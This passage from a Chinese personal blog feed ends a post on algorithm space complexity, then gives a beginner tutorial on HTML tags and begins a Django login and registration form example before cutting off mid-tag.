class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用<strong>最差输入数据视角</strong>来看最差空间复杂度：$n<10$时，空间复杂度为$O(1)$，$n>10$时，空间复杂度为$O(n)$，所有最差空间复杂度为$O(n)$</li><li>用<strong>算法运行中的峰值内存</strong>来看最差空间复杂度：运行到最后一行前，占用$O(1)$内存；运行到最后一行时，占用$O(n)$内存，故最差空间复杂度为$O(n)$.</li></ul><h4 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a><strong>递归算法</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 执行某些操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 循环的空间复杂度为 O(1) */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 递归的空间复杂度为 O(n) */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">recur</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">recur</span>(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>函数 <code>loop()</code> 在循环中调用了 n 次 <code>function()</code> ，每轮中的 <code>function()</code> 都返回并释放了栈帧空间，因此空间复杂度仍为 $O(1)$ 。</li><li>递归函数 <code>recur()</code> 在运行过程中会同时存在 n 个未返回的 <code>recur()</code> ，从而占用 $O(n)$ 的栈帧空间。</li></ul><h2 id="权衡时间与空间"><a href="#权衡时间与空间" class="headerlink" title="权衡时间与空间"></a>权衡时间与空间</h2><p>经常可以听到<strong>时间换空间</strong>，<strong>空间换时间</strong>等术语，实际情况中，同时优化时间复杂度和空间复杂度通常非常困难。</p><p>在大多数情况下，时间比空间更宝贵，因此“以空间换时间”通常是更常用的策略。当然，在数据量很大的情况下，控制空间复杂度也非常重要。</p></div>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 算法入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端三件套</title>
      <link href="/2024/08/15/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/"/>
      <url>/2024/08/15/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h1 id="前端开发"><a href="#前端开发" class="headerlink" title="前端开发"></a>前端开发</h1><p>众所周知，前端三剑客(htm、css、JavaScript)是一个网页不可或缺的元素，本篇博客记录学习前端三件套的历程。</p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>html里面有很多标签，下面来逐一介绍</p><h3 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  HTML 文档的文档类型声明</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        1级标题</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">        2级标题</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">h6</span>&gt;</span></span><br><span class="line">        6级标题</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="编码-head"><a href="#编码-head" class="headerlink" title="编码(head)"></a>编码(head)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义用<code>UTF-8</code>来对字符进行编码</p><h4 id="title-head"><a href="#title-head" class="headerlink" title="title(head)"></a>title(head)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>title</code>标签是显示在网页的title位置</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408152250388.png" alt="image-20240815225054322"></p><h4 id="多级标题-body"><a href="#多级标题-body" class="headerlink" title="多级标题(body)"></a>多级标题(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        1级标题</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">        2级标题</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">h6</span>&gt;</span></span><br><span class="line">        6级标题</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>&lt;h?&gt;</code>标签来表示?级标题</p><h4 id="div和span-body"><a href="#div和span-body" class="headerlink" title="div和span(body)"></a>div和span(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>test<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>&lt;div&gt;</code>表示块级标签，包裹的内容占一行<br>用<code>&lt;span&gt;</code>表示行内标签/内联标签，字体多大占多少</p><p>上述的多级标题默认为块级标签，一个占一行</p><h4 id="超链接-body"><a href="#超链接-body" class="headerlink" title="超链接(body)"></a>超链接(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://baidu.com&quot;</span>&gt;</span>点击跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面会出现一个蓝色字体的点击跳转字样，点击之后就会跳转到<code>baidu.com</code></p><p>如果想跳转到自己的网页，可以只写相对路径，例如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/login&quot;</span>&gt;</span>点击登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样实现的是当前页面跳转，如果想新建标签页跳转，只需添加<code>target</code>关键字</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>点击跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="图片-body"><a href="#图片-body" class="headerlink" title="图片(body)"></a>图片(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片地址&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>拿博客背景图举例：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407282152220.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>如果想导入自己本地的图片，要填写相对路径</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/xxx.jpg&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>如果想要设置图片的高度和宽度，要在地址后面加上<code>style</code>关键字</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407282152220.png&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>也可以按比例设置</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407282152220.png&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 50%;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li><p>划分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 块级标签</span><br><span class="line">&lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">- 行内标签</span><br><span class="line">&lt;span&gt;&lt;/span&gt;</span><br><span class="line">&lt;a&gt;&lt;/a&gt;</span><br><span class="line">&lt;img /&gt;</span><br></pre></td></tr></table></figure></li><li><p>嵌套</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就定义了一个包含超链接的图片，点击图片可以跳转，例如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>点击图片跳转<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">https://www.youngz-blog.asia</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407282152220.png&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="列表-body"><a href="#列表-body" class="headerlink" title="列表(body)"></a>列表(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实现的是一个无序号列表也就是markdown里面的</p><ul><li>test1</li><li>test2</li><li>test3</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实现的是一个有序号列表</p><ol><li>test1</li><li>test2</li><li>test3</li></ol><p>u和o分别指<code>unordered</code>和<code>ordered</code>，<code>&lt;li&gt;</code>属于块级标签</p><h4 id="表格-body"><a href="#表格-body" class="headerlink" title="表格(body)"></a>表格(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">th</span>&gt;</span>name<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="tag">&lt;<span class="name">th</span>&gt;</span>age<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="tag">&lt;<span class="name">th</span>&gt;</span>sex<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>18<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>男<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>19<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>男<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>王五<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>20<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>女<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408152344418.png" alt="image-20240815234417339"></p><p>嵌套有点多，一一来解释</p><ul><li><code>&lt;table&gt;</code>标签用来表明这是一个表标签</li><li><code>&lt;thead&gt;</code>即<code>table head</code>，用来指示表头</li><li><code>&lt;tbody&gt;</code>即<code>table body</code>，用来指示表的主体</li><li><code>&lt;tr&gt;</code>即<code>table row</code>，用来指示表的一行</li><li><code>&lt;th&gt;</code>和<code>&lt;td&gt;</code>分别用来指示表头和表主体的一列</li></ul><p>如果想加一个边框，可以添加<code>border</code>关键字</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">th</span>&gt;</span>name<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="tag">&lt;<span class="name">th</span>&gt;</span>age<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="tag">&lt;<span class="name">th</span>&gt;</span>sex<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>18<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>男<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>19<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>男<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>王五<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>20<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>女<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="input系列-body"><a href="#input系列-body" class="headerlink" title="input系列(body)"></a>input系列(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;n1&quot;</span>/&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;n1&quot;</span>/&gt;</span>女</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> /&gt;</span>唱</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> /&gt;</span>跳</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> /&gt;</span>rap</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> /&gt;</span>篮球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>text</code>类型为一个文本框</li><li><code>password</code>类型输入时会把输入内容变成黑点</li><li><code>file</code>类型生成一个<code>选择文件</code>的按钮</li><li><code>radio</code>类型会生成一个小圆点供选择，只有当两个<code>radio</code>的<code>name</code>是一样时才可以二选一，否则都可以选，但大多时候选择单选</li><li><code>checkbox</code>类型则是复选框，可以选多个</li><li><code>button</code>类型则是一个按钮</li><li><code>submit</code>类型也是一个按钮，但是它可以提交表单</li></ul><p>结果如图：</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408160016901.png" alt="image-20240816001641840"></p><p>由此可见，<code>input</code>标签也是一个内联标签</p><h4 id="下拉框-body"><a href="#下拉框-body" class="headerlink" title="下拉框(body)"></a>下拉框(body)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;select&gt;</code>定义一个下拉框，<code>&lt;option&gt;</code>里面存放选择项，如果添加了<code>multiple</code>关键字，则可以多选，长按鼠标左键即可。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408160022764.png" alt="image-20240816002214697"></p><h4 id="多行文本输入"><a href="#多行文本输入" class="headerlink" title="多行文本输入"></a>多行文本输入</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;textarea&gt;</code>用于定义一个用户可以多行输入的文本框，用户还可以自行拖动文本框尺寸，加入row关键字可以定义默认输入行数</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>默认显示一个高度为3行的文本框，但用户输入的行数可以大于3且可以拖动</p><h3 id="案例一：用户登录与注册界面"><a href="#案例一：用户登录与注册界面" class="headerlink" title="案例一：用户登录与注册界面"></a>案例一：用户登录与注册界面</h3><p>配合python里面的web框架，简略的制作一个用户登录与注册页面。这里以django为例，想了解django的伙伴可以看这篇文章</p><p><a href=https://www.youngz-blog.asia/2024/08/14/Django%E5%AE%9E%E8%B7%B5/ >Django实践</a></p><p>案例要求：实现一个简略的与登录与注册界面</p><p>案例思路：</p><ul><li><p>需要两个界面，<code>localhost:8000/Logintest</code>和<code>localhost:8000/register</code>，所以在urls.py里面定义两个页面</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> web.views <span class="keyword">import</span> *     <span class="comment">#这里填自己的app.views</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&quot;admin/&quot;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&quot;login/&quot;</span>, login),</span><br><span class="line">    path(<span class="string">&quot;user/&quot;</span>, user),</span><br><span class="line">    path(<span class="string">&quot;Logintest/&quot;</span>,Logintest),    <span class="comment">#这里可以自己定义路由和视图函数名</span></span><br><span class="line">    path(<span class="string">&quot;register/&quot;</span>,register)      </span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>实现这两个页面的逻辑，这里要介绍一个新的标签<code>&lt;form&gt;</code>，这个是表单标签，之前提到的<code>submit</code>类型的<code>input</code>标签就是用来提交这个表单标签的。有两个关键的字段：<code>action</code>和<code>method</code>。<br><code>action</code>：定义将表单提交到哪个路由(url)<br><code>method</code>：定义提交表单的方法，一般有<code>GET</code>和<code>POST</code>两种：</p><ul><li><code>GET</code>：一般用来获取数据，提交的数据一般在放在URL中，安全性比较差。常见会有一个<code>?(</code>query提示符)接上提交的参数，例如在浏览器搜索的时候，会把搜索的东西放到URL里面去</li><li><code>POST</code>：一般用来提交数据，提交的数据不会在URL显示出来，提交的数据是放在数据包的<code>body</code>字段</li></ul><p>了解了上述知识之后就可以开始编写html文件了，在web(自己的app名字)/templates文件夹下编写<code>Logintest.html</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/Logintest/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">        &#123;% csrf_token %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                Username:</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                Password:</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 